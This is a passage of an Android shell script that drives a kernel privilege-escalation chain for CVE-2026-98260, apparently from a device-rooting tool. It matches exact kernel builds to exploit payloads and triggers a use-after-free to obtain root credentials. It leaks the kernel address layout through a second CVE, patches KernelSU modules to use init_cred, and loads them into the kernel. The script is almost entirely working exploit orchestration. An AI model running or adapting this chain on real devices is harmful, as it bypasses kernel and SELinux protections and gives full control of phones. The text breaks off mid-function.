#!/system/bin/sh
# CVE-2026-98260 complete root chain (opt-in).
# Validated BRM chain: kprobe-free UAF -> in-place real cred -> temporary
# command handoff -> KSU load.  The handoff has cred == real_cred and is not
# the fake-cred page keeper; finalize can reap it normally.
#
# Invoked by $D/run.sh only when MAGICROOT_CHAIN=98260 and
# MAGICROOT_ENABLE_98260=1 (the app sets these after explicit confirmation).
# Success proof: the command socket exists and su98260 returns uid=0 with
# /proc/self/status Uid/Gid all zero.  The UAF page-holding parent remains
# parked until reboot; the temporary command listener is removed at finalize.

set -u

D=/data/local/tmp/magic
SOCK=/data/local/tmp/pc98260-root.sock
LOG=$D/98260.log
RUN_ID="$(date '+%Y%m%dT%H%M%S' 2>/dev/null || echo unknown)-$$"
STATE=$D/98260-$RUN_ID.state
KOPATCH_BIN=${MAGICROOT_KOPATCH:-$D/ko_patch}
[ -x "$KOPATCH_BIN" ] || KOPATCH_BIN=$D/ko_patch
VERIFY=$D/98260-verify.log
VERIFY_RAW=$D/98260-verify.raw
KERNEL=$(uname -r 2>/dev/null || echo unknown)
MODEL=$(getprop ro.product.model 2>/dev/null || echo unknown)
KMI=$(printf '%s' "$KERNEL" | sed -n 's/.*android\([0-9][0-9]*\).*/android\1/p')-$(printf '%s' "$KERNEL" | cut -d. -f1,2)
[ -n "$KMI" ] || KMI=android16-6.12
echo "98260_KMI=$KMI"

# Same-boot parked guard.  A failed UAF deliberately leaves the exploit parent
# alive; killing/reaping it can trip posix_cpu_timers_exit.  Never start a
# second plant in the same boot.  The marker stores only boot_id so clean.sh
# can compare it without parsing a PID.
PARKED_MARKER=/data/local/tmp/.magicroot-98260-parked
[ -f "$D/lib.sh" ] && . "$D/lib.sh"
BOOT_ID=$(current_boot_id)
parked_check() {
    [ -f "$PARKED_MARKER" ] || return 0
    _b=$(sed -n '1p' "$PARKED_MARKER" 2>/dev/null | tr -d ' \r\n')
    _cur=$(current_boot_id)
    if [ -n "$_b" ] && [ "$_b" = "$_cur" ]; then
        echo "FAIL=98260_parked_reboot_required marker=$PARKED_MARKER boot=$_b"
        echo "HINT=UAF failed earlier in this boot; reboot. Do NOT kill the parked exploit and do NOT start a second plant."
        echo "98260_CHAIN_END=FAIL code=80"
        exit 80
    fi
    if ! rm -f "$PARKED_MARKER" 2>/dev/null; then
        echo "FAIL=98260_parked_stale_remove_failed marker=$PARKED_MARKER boot=$_b"
        echo "98260_CHAIN_END=FAIL code=80"
        exit 80
    fi
    echo "98260_PARKED_STALE=1 removed_boot=$_b current_boot=$_cur"
}
UAF_ARMED=0
trap 'if [ "${UAF_ARMED:-0}" = "1" ]; then parked_mark || true; fi' EXIT
trap 'if [ "${UAF_ARMED:-0}" = "1" ]; then parked_mark || true; fi; exit 80' INT TERM HUP

# The rootd client is an interactive sh; its prompt prefixes every line.
# Strip only the prompt so "0" / "Uid: 0 0 0 0" can be parsed reliably.
verify_su() {
    "$SU" -c 'id -u; id -g; getenforce; cat /proc/self/status | grep -E "Uid|Gid"' \
        > "$VERIFY_RAW" 2>&1
    sed 's/^[^#]*# //' "$VERIFY_RAW" > "$VERIFY" 2>/dev/null \
        || cp "$VERIFY_RAW" "$VERIFY"
}

# finit_module must run in the real-cred listener itself.  A fork/exec helper
# recalculates capabilities from CapBnd (which lacks SYS_MODULE on this ROM).
real_cred_finit() {
    _rf_path=$1
    _rf_params=${2:-}
    _rf_exit=${3:-0}
    _rf_cmd=__PC98260_FINIT__
    [ "$_rf_exit" = "1" ] && _rf_cmd=__PC98260_FINIT_EXIT__
    _rf_out=$(printf '%s %s%s\n' "$_rf_cmd" "$_rf_path" \
        "${_rf_params:+ $_rf_params}" | "$SU" 2>&1)
    _rf_rc=$?
    printf '%s\n' "$_rf_out"
    echo "98260_REAL_CRED_FINIT_CLIENT_RC=$_rf_rc path=$_rf_path"
    [ "$_rf_rc" = "0" ] && printf '%s\n' "$_rf_out" | grep -q 'FINIT_RC=0'
}

# Real-cred delivery sets real/effective/saved/fs IDs to zero.  Retain the
# legacy parser branches for old logs, but current runs always take the
# all-zero real-cred proof.
verify_credential_fields() {
    if [ "$REAL_CRED_ARG" = "--no-real-cred" ]; then
        awk '
            /^Uid:/ { if ($3 != 0 || $4 != 0 || $5 != 0) bad = 1; uid = 1 }
            /^Gid:/ { if ($3 != 0 || $4 != 0 || $5 != 0) bad = 1; gid = 1 }
            END { exit (uid && gid && !bad) ? 0 : 1 }
        ' "$VERIFY"
    else
        grep -q '^Uid:[[:space:]]*0[[:space:]]*0[[:space:]]*0[[:space:]]*0' "$VERIFY" &&
            grep -q '^Gid:[[:space:]]*0[[:space:]]*0[[:space:]]*0[[:space:]]*0' "$VERIFY"
    fi
}

PROVIDER_TRIES=30
SU_WAIT_TRIES=120

wait_for_su_provider() {
    _i=0
    while [ "$_i" -lt "$PROVIDER_TRIES" ]; do
        for _c in su /data/adb/ksu/bin/su /system/bin/su; do
            case "$_c" in
                /*) [ -x "$_c" ] || continue ;;
                *) command -v "$_c" >/dev/null 2>&1 || continue ;;
            esac
            _u=$(timeout 3 "$_c" -c 'id -u' 2>&1 | tr -d ' \r\n')
            if [ "$_i" = "0" ] && [ -n "$_u" ] && [ "$_u" != "0" ]; then
                echo "98260_SU_PROVIDER_TRY=$_c out=$_u"
            fi
            if [ "$_u" = "0" ]; then
                echo "98260_SU_PROVIDER=ready path=$_c attempts=$_i"
                export KSU_SU_PROVIDER="$_c"
                return 0
            fi
            case "$_u" in
                *unknown*provider*|*Unknown*Provider*)
                    echo "98260_SU_PROVIDER_ERROR=unknown_su_provider path=$_c out=$_u" ;;
            esac
        done
        _i=$((_i + 1))
        sleep 1
    done
    echo "98260_SU_PROVIDER=unavailable attempts=$_i"
    return 1
}

ATTEMPTS=$(num_or "${MAGICROOT_98260_ATTEMPTS:-}" 12)
CHURN_ROUNDS=$(num_or "${MAGICROOT_98260_CHURN_ROUNDS:-}" 8)
CHURN_PER_CPU=$(num_or "${MAGICROOT_98260_CHURN_PER_CPU:-}" 256)
WAIT_CAP=$(num_or "${MAGICROOT_98260_WAIT_CAP:-}" 8)
BUDGET=$(num_or "${MAGICROOT_98260_BUDGET_S:-}" 180)
PROOF_WAIT=$(num_or "${MAGICROOT_98260_PROOF_WAIT_S:-}" 720)
CUSTOM_KO=${MAGICROOT_CUSTOM_KO:-${MAGICROOT_98260_CUSTOM_KO:-}}

# Live-plant rejection happens only after rootd/KSU reuse has been attempted.
# A valid existing rootd is a success path, not a reason to demand a reboot.
echo "98260_CHAIN_BEGIN kernel=$KERNEL time=$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null) run=$RUN_ID boot=$BOOT_ID"

case "$KERNEL" in
    "6.12.58-android16-6-g459a4285ccf8-abogki532718632-4k")
        if [ "$MODEL" = "APH-AN00" ]; then
            B=$D/98260-aph112
        else
            B=$D/98260-61258b
        fi ;;
    "6.12.58-android16-6-g42fcf008ff5c-abogki504518581-4k")
        B=$D/98260-61258c ;;
    "6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k")
        B=$D/98260 ;;
    "6.12.58-android16-6-g142ddad31e60-abogki576095858-4k")
        B=$D/98260-g142 ;;
    "6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k")
        B=$D/98260-6138 ;;
    "6.12.23-android16-5-g45ea5e4bce8a-abogki445100407-4k")
        B=$D/98260-6123 ;;
    "6.12.23-android16-5-gcd85666d7884-abogki452537391-4k")
        B=$D/98260-g856 ;;
    "6.12.38-android16-5-g7ae8ec909e03-abogki471017112-4k")
        B=$D/98260-6138y ;;
    "6.12.38-android16-5-g4b3671e1f5b7-abogki460618149-4k")
        B=$D/98260-g4b36 ;;
    "6.12.81-android16-6-g52d15df5db87-abogki576042287-4k")
        B=$D/98260-g52d15 ;;
    "6.6.58-android15-8-g6484937db664-abogki407459068-4k")
        B=$D/98260-6658 ;;
    "6.6.118-android15-8-g554929766a0d-abogki544555896-4k")
        B=$D/98260-g554 ;;
    "6.6.118-android15-8-gf17133276a57-abogki518694926-4k")
        B=$D/98260-f171 ;;
    "6.6.89-android15-8-g082e5a98dac1-abogki463734347-4k")
        B=$D/98260-6689 ;;
    "6.6.118-android15-8-ga812a1946391-abogki576098434-4k")
        B=$D/98260-ga812 ;;
    "6.6.118-android15-8-g893e848657cc-4k")
        B=$D/98260-g893 ;;
    "6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k")
        B=$D/98260-61821 ;;
    "6.18.21-android17-5-ge186062ea75f-abogki564062290-4k")
        B=$D/98260-61821-brm ;;
    "6.18.21-android17-5-gfee2325de189-abogki572422516-4k")
        B=$D/98260-61821-117 ;;
    *6.18.21*)
        # Adaptive H1C profile generated from this exact boot.img.
        if [ "${MAGICROOT_98260_ADAPTIVE:-0}" = "1" ]; then
            B=$D/98260-61821
            echo "98260_KERNEL_ADAPTIVE=$KERNEL"
        else
            echo "FAIL=kernel_unsupported adaptive_profile_missing actual=$KERNEL"
            echo "HINT=导入当前设备的 boot.img 生成自适应配置后重试"
            echo "98260_CHAIN_END=FAIL code=71"
            exit 71
        fi ;;
    *)
        echo "FAIL=kernel_unsupported actual=$KERNEL"
        echo "98260_CHAIN_END=FAIL code=71"
        exit 71 ;;
esac

if [ -f "$B/target.sh" ]; then
    . "$B/target.sh"
    if [ -n "${CHAIN_98260_KERNEL:-}" ] && [ "$CHAIN_98260_KERNEL" != "$KERNEL" ]; then
        echo "FAIL=target_kernel_mismatch target=$CHAIN_98260_KERNEL actual=$KERNEL dir=$B"
        exit 71
    fi
fi

# Resolve the KernelSU/asset profile from the exact kernel release before any
# exploit code runs.  The same table is used by run.sh's select_chain_98260_profile;
# the explicit id comparison catches a stale run98260.sh deployed over a newer
# kernel_profiles.sh before the UAF is started.
case "$KERNEL" in
    "6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k")
        PROFILE_LOCAL=61258; _PROFILE_ID_EXPECT=honor-61258-98260 ;;
    "6.12.58-android16-6-g142ddad31e60-abogki576095858-4k")
        PROFILE_LOCAL=g142; _PROFILE_ID_EXPECT=honor-g142-98260 ;;
    "6.12.58-android16-6-g459a4285ccf8-abogki532718632-4k")
        if [ "$MODEL" = "APH-AN00" ]; then
            PROFILE_LOCAL=aph112; _PROFILE_ID_EXPECT=honor-aph112-98260
        else
            PROFILE_LOCAL=61258b; _PROFILE_ID_EXPECT=honor-61258b-98260
        fi ;;
    "6.12.58-android16-6-g42fcf008ff5c-abogki504518581-4k")
        PROFILE_LOCAL=61258c; _PROFILE_ID_EXPECT=honor-61258c-98260 ;;
    "6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k")
        PROFILE_LOCAL=6138; _PROFILE_ID_EXPECT=honor-6138-98260 ;;
    "6.12.23-android16-5-g45ea5e4bce8a-abogki445100407-4k")
        PROFILE_LOCAL=6123; _PROFILE_ID_EXPECT=honor-6123-98260 ;;
    "6.12.23-android16-5-gcd85666d7884-abogki452537391-4k")
        PROFILE_LOCAL=g856; _PROFILE_ID_EXPECT=honor-g856-98260 ;;
    "6.12.38-android16-5-g7ae8ec909e03-abogki471017112-4k")
        PROFILE_LOCAL=6138y; _PROFILE_ID_EXPECT=honor-6138y-98260 ;;
    "6.12.38-android16-5-g4b3671e1f5b7-abogki460618149-4k")
        PROFILE_LOCAL=g4b36; _PROFILE_ID_EXPECT=honor-g4b36-98260 ;;
    "6.12.81-android16-6-g52d15df5db87-abogki576042287-4k")
        PROFILE_LOCAL=g52d15; _PROFILE_ID_EXPECT=honor-g52d15-98260 ;;
    "6.6.58-android15-8-g6484937db664-abogki407459068-4k")
        PROFILE_LOCAL=6658; _PROFILE_ID_EXPECT=honor-6658-98260 ;;
    "6.6.118-android15-8-g554929766a0d-abogki544555896-4k")
        PROFILE_LOCAL=g554; _PROFILE_ID_EXPECT=honor-g554-66118-98260 ;;
    "6.6.118-android15-8-gf17133276a57-abogki518694926-4k")
        PROFILE_LOCAL=f171; _PROFILE_ID_EXPECT=honor-f171-66118-98260 ;;
    "6.6.89-android15-8-g082e5a98dac1-abogki463734347-4k")
        PROFILE_LOCAL=6689; _PROFILE_ID_EXPECT=honor-6689-98260 ;;
    "6.6.118-android15-8-ga812a1946391-abogki576098434-4k")
        PROFILE_LOCAL=ga812; _PROFILE_ID_EXPECT=honor-ga812-98260 ;;
    "6.6.118-android15-8-g893e848657cc-4k")
        PROFILE_LOCAL=g893; _PROFILE_ID_EXPECT=honor-g893-66118-98260 ;;
    "6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k")
        PROFILE_LOCAL=61821; _PROFILE_ID_EXPECT=honor-61821-98260 ;;
    "6.18.21-android17-5-ge186062ea75f-abogki564062290-4k")
        PROFILE_LOCAL=61821brm; _PROFILE_ID_EXPECT=honor-61821-brm-98260 ;;
    "6.18.21-android17-5-gfee2325de189-abogki572422516-4k")
        PROFILE_LOCAL=61821h1c117; _PROFILE_ID_EXPECT=honor-61821-h1c117-98260 ;;
    *6.18.21*)
        if [ "${MAGICROOT_98260_ADAPTIVE:-0}" = "1" ]; then
            PROFILE_LOCAL=61821; _PROFILE_ID_EXPECT=honor-61821-98260
        else
            echo "FAIL=kernel_unsupported adaptive_profile_missing actual=$KERNEL"
            echo "98260_CHAIN_END=FAIL code=71"; exit 71
        fi ;;
    *)
        echo "FAIL=kernel_unsupported actual=$KERNEL"
        echo "98260_CHAIN_END=FAIL code=71"
        exit 71 ;;
esac
if [ -n "${MAGICROOT_98260_PROFILE:-}" ] &&
   [ "$MAGICROOT_98260_PROFILE" != "$_PROFILE_ID_EXPECT" ]; then
    echo "FAIL=profile_kernel_mismatch selected=$MAGICROOT_98260_PROFILE expected=$_PROFILE_ID_EXPECT profile=$PROFILE_LOCAL kernel=$KERNEL"
    echo "98260_CHAIN_END=FAIL code=72"
    exit 72
fi
echo "98260_PROFILE_MATCH=1 profile=$PROFILE_LOCAL kernel=$KERNEL selected=${MAGICROOT_98260_PROFILE:-manual}"
H1C_ONLY=0
case "$PROFILE_LOCAL" in
    61821|61821brm|61821h1c117) H1C_ONLY=1 ;;
esac
echo "98260_ENGINE=h1c only=$H1C_ONLY"

if [ -n "${CHAIN_98260_SU_WAIT_TRIES:-}" ]; then
    SU_WAIT_TRIES=$CHAIN_98260_SU_WAIT_TRIES
fi
if [ -n "${CHAIN_98260_PROVIDER_TRIES:-}" ]; then
    PROVIDER_TRIES=$CHAIN_98260_PROVIDER_TRIES
fi

# Per-profile knobs live in each profile's target.sh.  The shared script
# keeps the verified 6.6/6.12 defaults, so a single-version adaptation never
# changes another working path.
# Select the delivery protocol by payload engine.  Provenance-locked legacy
# binaries stay on their original rootd/insmod path until rebuilt as real-cred.
REAL_CRED_NATIVE=0
DUAL_CRED_AVAILABLE=0
case "$B" in
    "$D/98260"|"$D/98260-61258b"|"$D/98260-61258c"|\
    "$D/98260-6138"|"$D/98260-6123"|"$D/98260-g856"|\
    "$D/98260-6138y"|"$D/98260-g142"|"$D/98260-aph112"|\
    "$D/98260-6658"|"$D/98260-6689"|"$D/98260-ga812"|"$D/98260-g893")
        REAL_CRED_NATIVE=1
        DUAL_CRED_AVAILABLE=1 ;;
    "$D/98260-61821"|"$D/98260-61821-brm")
        REAL_CRED_NATIVE=1 ;;
esac
CRED_MODE=${MAGICROOT_98260_CRED_MODE:-fake}
case "$CRED_MODE" in real|fake) ;; *) CRED_MODE=fake ;; esac
if [ "$CRED_MODE" = "fake" ]; then
    # All 98260 payload families carry the legacy fake-cred engine.  The
    # rebuilt 6.12/6.6 binaries consume --no-real-cred directly; the
    # provenance-locked g554/f171 payloads already contain the same engine;
    # 6.18.21 is handed to the H1C fake-cred chain below.  Do not confuse
    # real-cred direct-finit capability with fake-cred availability.
    REAL_CRED_NATIVE=0
fi
REAL_CRED_ENV=""
if [ "$REAL_CRED_NATIVE" = "1" ]; then
    REAL_CRED_ARG=""
    # The real-cred listener cannot bind on this ROM, so PC98260_ROOTD is not
    # requested anymore; KSU is loaded by the mintwait child in-process.
    if [ "${MAGICROOT_98260_KSU:-1}" = "1" ]; then
        REAL_CRED_ENV="PC98260_KSU=1"
    fi
else
    REAL_CRED_ARG="--no-real-cred"
    if [ "$CRED_MODE" = "fake" ]; then
        # fake-cred must exec the child as mintwait-rootd; without this the
        # child becomes a plain shell and the legacy late-load socket never
        # exists even though the UAF itself succeeded.
        REAL_CRED_ENV="PC98260_ROOTD=1"
    fi
fi
if [ "$DUAL_CRED_AVAILABLE" = "1" ] && [ "${MAGICROOT_98260_PREFLIGHT:-0}" != "1" ]; then
    if [ -z "${MAGICROOT_KSUD:-}" ] || [ ! -x "${MAGICROOT_KSUD:-}" ] ||
       [ -z "${MAGICROOT_MANAGER_KO:-}" ] || [ ! -f "${MAGICROOT_MANAGER_KO:-}" ]; then
        echo "FAIL=98260_manager_pair_missing mode=$CRED_MODE ksud=${MAGICROOT_KSUD:-none} ko=${MAGICROOT_MANAGER_KO:-none}"
        echo "HINT=extract both ksud and LKM from the selected manager APK; bundled/mismatched fallbacks are forbidden"
        echo "98260_CHAIN_END=FAIL code=74"
        exit 74
    fi
    if [ -n "${CUSTOM_KO:-}" ]; then
        echo "FAIL=98260_custom_ko_conflicts_with_manager_pair mode=$CRED_MODE"
        echo "98260_CHAIN_END=FAIL code=74"
        exit 74
    fi
    echo "98260_MANAGER_PAIR=strict mode=$CRED_MODE ksud=$MAGICROOT_KSUD ko=$MAGICROOT_MANAGER_KO"
fi
ABORT_ENV=""
FALLBACK_ENV=""
STREAM_BUF_ENV=""
if [ "${CHAIN_98260_ABORT_PAGE_MISS:-0}" = "1" ]; then
    ABORT_ENV="PC98260_ABORT_ON_PAGE_MISS=1"
fi
# Experimental escape hatches, both default OFF:
#  - ENABLE_FALLBACK lets a stream miss fall through to the pipe/AIO reclaim
#    primitives.  Their hit detection is weaker than the stream path's
#    task-verified check, so this stays opt-in for field debugging only.
#  - STREAM_BUF_KB overrides the per-cpu trace buffer used during reclaim
#    (payload default 8192) for diagnosing trace-scan misses.
if [ "${CHAIN_98260_ENABLE_FALLBACK:-0}" = "1" ] ||
   [ "${MAGICROOT_98260_FALLBACK:-0}" = "1" ]; then
    FALLBACK_ENV="PC98260_ENABLE_FALLBACK=1"
fi
if [ -n "${MAGICROOT_98260_STREAM_BUF_KB:-}" ]; then
    STREAM_BUF_ENV="PC98260_STREAM_BUF_KB=$MAGICROOT_98260_STREAM_BUF_KB"
fi
if [ -n "${CHAIN_98260_WAIT_CAP:-}" ] &&
   [ -z "${MAGICROOT_98260_WAIT_CAP:-}" ]; then
    WAIT_CAP=$CHAIN_98260_WAIT_CAP
fi


BIN=$B/exploit-android-key-ptr
# pc98260-su is byte-identical across the 6.6 builds; keep one common copy.
if [ -n "${MAGICROOT_SU:-}" ] && [ -x "$MAGICROOT_SU" ]; then
    SU=$MAGICROOT_SU
else
    SU=$B/pc98260-su
    [ -x "$SU" ] || SU=$D/pc98260-su
fi
if [ "$H1C_ONLY" != "1" ]; then
    [ -x "$BIN" ] || { echo "FAIL=asset_missing $BIN"; exit 73; }
    # pc98260-su belongs to the legacy BRM chain only.  H1C profiles deploy
    # neither it nor exploit-android-key-ptr for their own engine, so requiring
    # it here aborted the run before the H1C dispatch was ever reached.
    [ -x "$SU" ] || { echo "FAIL=asset_missing $SU"; exit 73; }
fi

ksu_loaded_98260() {
    grep -q '^kernelsu ' /proc/modules 2>/dev/null && return 0
    [ -d /sys/module/kernelsu ] && return 0
    if [ -x "$SU" ]; then
        _kl=$("$SU" -c 'grep -q "^kernelsu " /proc/modules && echo load' 2>/dev/null | tr -d '\r\n')
        case "$_kl" in *load*) return 0 ;; esac
    fi
    return 1
}

# Record the successful KSU load, then continue through the common post-load
# tail.  The old exit 0 here skipped su verification, feature configuration and
# the final Enforcing check, leaving the UI-requested SELinux feature disabled.
# Rootd cleanup remains deferred until a real KSU su proof succeeds.
finish_ksu_loaded() {
    _f_method=${1:-unknown}
    _f_reused=${2:-0}
    KSU_REUSED_98260=$_f_reused
    : > "$D/.ksu_loaded" 2>/dev/null || true
    rm -f "$D/.ksu_su_ready" 2>/dev/null || true
    echo "98260_KSU=loaded method=$_f_method flavor=$KSU_FLAVOR_LOCAL"
    echo "98260_CLEANUP=pending reason=ksu_su_proof"
    # Surface the armed-victim ledger from the plant log before cleanup can
    # delete it: unproven>0 means this success still carries a panic-at-teardown
    # risk even though rootd/KSU are up.
    if [ -s "$LOG" ] && grep -q '\[victim\]' "$LOG" 2>/dev/null; then
        grep '\[victim\]' "$LOG" | sed 's/^/98260_VICTIM /'
    fi
    return 0
}

manager_fd_pid_98260() {
    _mf_pkg=$1
    "$SU" -c "for p in \$(pidof '$_mf_pkg' 2>/dev/null); do if readlink /proc/\$p/fd/* 2>/dev/null | grep -q '^anon_inode:\[ksu_driver\]$'; then echo \$p; exit 0; fi; done; exit 1" 2>/dev/null
}

refresh_manager_98260() {
    _rf_pkg=$1
    [ -n "$_rf_pkg" ] || return 1
    am force-stop "$_rf_pkg" >/dev/null 2>&1 || true
    monkey -p "$_rf_pkg" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 || true
    _rf_wait=0
    while [ "$_rf_wait" -lt 15 ]; do
        _rf_pid=$(manager_fd_pid_98260 "$_rf_pkg")
        case "$_rf_pid" in
            ''|*[!0-9]*) ;;
            *)
                echo "98260_MANAGER_CONNECTED=1 pid=$_rf_pid waited=${_rf_wait}s" | tee -a "$KSU_LOG"
                return 0
                ;;
        esac
        sleep 1
        _rf_wait=$((_rf_wait + 1))
    done
    echo "98260_MANAGER_CONNECTED=0 pkg=$_rf_pkg waited=${_rf_wait}s" | tee -a "$KSU_LOG"
    return 1
}

# Patch the selected manager LKM before any late-load.  Besides resolving the
# normal per-flavor symbols, ko_patch rewrites track_throne/do_track_throne to
# use init_cred, so crown never inherits the late-load caller's limited creds.
patch_init_cred_module_98260() {
    INIT_CRED_PATCHED=$D/98260/ksu-init-cred.ko
    _pi_log=$D/98260-init-cred-patch.log
    if [ -z "$SLIDE" ] || [ -z "$KO_TEMPLATE" ] || [ ! -f "$KO_TEMPLATE" ] ||
       [ -z "$SYMS" ] || [ ! -f "$SYMS" ] || [ ! -x "$KOPATCH_BIN" ]; then
        echo "98260_INIT_CRED_PATCH=failed reason=inputs_missing" | tee -a "$KSU_LOG"
        return 1
    fi
    rm -f "$INIT_CRED_PATCHED" "$_pi_log"
    "$KOPATCH_BIN" "$KO_TEMPLATE" "$INIT_CRED_PATCHED" "$SYMS" "$SLIDE" "$KERNEL" >"$_pi_log" 2>&1
    _pi_rc=$?
    _pi_throne=$(grep -m1 '^TRACK_THRONE=' "$_pi_log" 2>/dev/null)
    _pi_line=$(grep '^PATCHED=' "$_pi_log" 2>/dev/null | tail -1)
    _pi_missing=$(printf '%s\n' "$_pi_line" | sed -n 's/^PATCHED=[0-9]* MISSING=\([0-9][0-9]*\).*/\1/p')
    cat "$_pi_log" >> "$KSU_LOG"
    case "$_pi_throne" in
        TRACK_THRONE=unavailable)
            echo "98260_INIT_CRED_PATCH=unavailable reason=no_proven_symbol" | tee -a "$KSU_LOG"
            return 2
            ;;
        TRACK_THRONE=no_reloc)
            # Some manager LKMs (e.g. official KernelSU 3.3.0, uapi 2) build
            # track_throne without any ksu_cred relocation, so there is
            # nothing to rewrite.  Treat that like "unavailable" instead of
            # failing the whole handoff (2026-11-14 00:53/00:58 6689 runs).
            echo "98260_INIT_CRED_PATCH=skipped reason=no_ksu_reloc detail=$_pi_throne" | tee -a "$KSU_LOG"
            return 2
            ;;
        TRACK_THRONE=disabled)
            # 1.0.5-compatible default: only symbol/vermagic rewriting.  The
            # init_cred rewrite is opt-in (MAGICROOT_THRONE_PATCH=1) because it
            # changes the cred/SELinux blob used when granting root.
            echo "98260_THRONE_PATCH=disabled reason=compat_default" | tee -a "$KSU_LOG"
            ;;
        TRACK_THRONE=patched*|TRACK_THRONE=already*) ;;
        *)
            echo "98260_INIT_CRED_PATCH=failed reason=throne_not_rewritten rc=$_pi_rc detail=${_pi_throne:-missing}" | tee -a "$KSU_LOG"
            return 1
            ;;
    esac
    if [ "$_pi_rc" != "0" ] || [ "${_pi_missing:-1}" != "0" ] || [ ! -f "$INIT_CRED_PATCHED" ]; then
        echo "98260_INIT_CRED_PATCH=failed reason=symbols_or_rc rc=$_pi_rc missing=${_pi_missing:-unknown}" | tee -a "$KSU_LOG"
        return 1
    fi
    if ! printf '%s\n' "$_pi_line" | grep -Fq "VERMAGIC=$KERNEL SMP"; then
        echo "98260_INIT_CRED_PATCH=failed reason=vermagic_mismatch" | tee -a "$KSU_LOG"
        return 1
    fi
    echo "98260_INIT_CRED_PATCH=ok path=$INIT_CRED_PATCHED throne=$_pi_throne" | tee -a "$KSU_LOG"
    return 0
}

# Manager registration for the direct-finit path.  The manager's own ksud
# observes that the LKM is already loaded, skips its embedded-module load, then
# performs the normal late-load userspace stages and restarts the selected
# package.  Never chmod/rename packages.list and never hand-edit PM state.
register_manager_98260() {
    _rm_pkg=${MAGICROOT_KSU_PKG:-$(ksu_flavor_pkg "$KSU_FLAVOR_LOCAL" 2>/dev/null || true)}
    _rm_provider=${KSU_SU_PROVIDER:-$SU}
    if [ -z "$_rm_pkg" ] || [ -z "$_rm_provider" ] || [ -z "$KSUD" ] || [ ! -x "$KSUD" ]; then
        echo "98260_MANAGER_REGISTER=failed reason=late_load_inputs_missing" | tee -a "$KSU_LOG"
        return 1
    fi
    _rm_allow=""
    [ "$ALLOW_SHELL_98260" = "1" ] && _rm_allow=" --allow-shell"
    echo "98260_MANAGER_LATELOAD_BEGIN mode=real-cred-post-finit kmi=$KMI pkg=$_rm_pkg ksud=$KSUD" | tee -a "$KSU_LOG"
    echo "98260_MANAGER_PACKAGES=untouched" | tee -a "$KSU_LOG"
    "$_rm_provider" -c "export LD_LIBRARY_PATH='$D'; '$KSUD' late-load --kmi '$KMI' --package-name '$_rm_pkg'$_rm_allow" >>"$KSU_LOG" 2>&1
    _rm_rc=$?
    echo "98260_MANAGER_LATELOAD_RC=$_rm_rc pkg=$_rm_pkg" | tee -a "$KSU_LOG"
    if [ "$_rm_rc" != "0" ]; then
        echo "98260_MANAGER_REGISTER=failed pkg=$_rm_pkg root=kept" | tee -a "$KSU_LOG"
        return 1
    fi
    echo "98260_MANAGER_REGISTER=done pkg=$_rm_pkg method=manager-late-load" | tee -a "$KSU_LOG"
    refresh_manager_98260 "$_rm_pkg" || true
    return 0
}

# Read-only preflight mode: only --check, no UAF.  H1C has its own native
# preflight and must never be checked with the legacy BRM payload.
if [ "${MAGICROOT_98260_PREFLIGHT:-0}" = "1" ] && [ "$H1C_ONLY" != "1" ]; then
    echo "98260_PREFLIGHT=1 engine=legacy"
    "$BIN" --check
    RC=$?
    echo "98260_CHAIN_END=PREFLIGHT code=$RC"
    exit "$RC"
fi

# BRM ReSukiSU raw-trace KASLR probe for the g928 6.18 profile.
# slide_probe creates one timer and reads the raw trace; slide is
# call_site - LINK_ALLOC_TIMER.  HOneClick helpers belong to the 64560
# chain and are intentionally not used here.  Explicit MAGICROOT_98260_SLIDE
# still wins; on probe failure the binary's internal sampler remains.
SLIDE_ARG=""
# External KASLR oracle: CVE-2026-98937 perf callchain leak.
# Enabled by default (auto) when the module and target constants exist;
# MAGICROOT_KASLR_SOURCE=off (or 0/none) disables, =98937 forces.
# The 98260 payload reads --slide and skips its internal measure_slide();
# on any failure the existing internal/raw/legacy sources below still run.
KASLR_98937_ENABLE=${MAGICROOT_KASLR_SOURCE:-auto}
case "$KASLR_98937_ENABLE" in off|0|none) KASLR_98937_ENABLE=off ;; esac
if [ "$KASLR_98937_ENABLE" != "off" ] && [ -f "$D/kaslr-98937/enable" ]; then
    KASLR_98937_ENABLE=98937
fi
if [ "$H1C_ONLY" != "1" ] && [ "$KASLR_98937_ENABLE" != "off" ]; then
    if [ -x "$D/kaslr-98937/run98937.sh" ]; then
        echo "98260_SLIDE_98937_BEGIN"
        _o989=$(sh "$D/kaslr-98937/run98937.sh" 2>&1); _r989=$?
        printf '%s\n' "$_o989" | grep -E '^KASLR_(SLIDE|SOURCE|ANCHORS|VOTES|BYTES|ERROR)=' | tail -8
        _s989=$(printf '%s\n' "$_o989" | sed -n 's/^KASLR_SLIDE=//p' | head -1 | tr -d '\r')
        case "$_s989" in
            0x*00000)
                SLIDE_ARG="--slide $_s989"
                SLIDE=$_s989
                echo "98260_SLIDE_SOURCE=98937 value=$_s989"
                ;;
            *)
                echo "98260_SLIDE_98937_REJECT rc=$_r989 value=${_s989:-none}"
                ;;
        esac
    elif [ "$KASLR_98937_ENABLE" = "98937" ]; then
        echo "98260_SLIDE_98937_MISSING path=$D/kaslr-98937/run98937.sh"
    fi
fi
if [ "$H1C_ONLY" = "1" ]; then
    echo "98260_SLIDE_SOURCE=h1c_internal"
else
case "$B" in
    "$D/98260-61821")
        if [ -n "${MAGICROOT_98260_SLIDE:-}" ]; then
            _exp_num=$((MAGICROOT_98260_SLIDE)) 2>/dev/null || _exp_num=-1
            if [ "$_exp_num" -ge 0 ] 2>/dev/null &&
               [ $((_exp_num % 2097152)) -eq 0 ]; then
                SLIDE_ARG="--slide $MAGICROOT_98260_SLIDE"
                SLIDE=$MAGICROOT_98260_SLIDE
                echo "98260_SLIDE_SOURCE=explicit value=$MAGICROOT_98260_SLIDE"
            else
                echo "98260_SLIDE_REJECT value=$MAGICROOT_98260_SLIDE reason=explicit_unaligned"
            fi
        fi
        if [ -z "$SLIDE_ARG" ] && [ -x "$B/slide_probe" ] &&
             [ "${MAGICROOT_98260_RAW_SLIDE:-1}" = "1" ]; then
            # BRM ReSukiSU raw-trace probe: timer_create call_site - link.
            echo "98260_SLIDE_RAW_BEGIN probe=$B/slide_probe link=0xffffffc0803e005c"
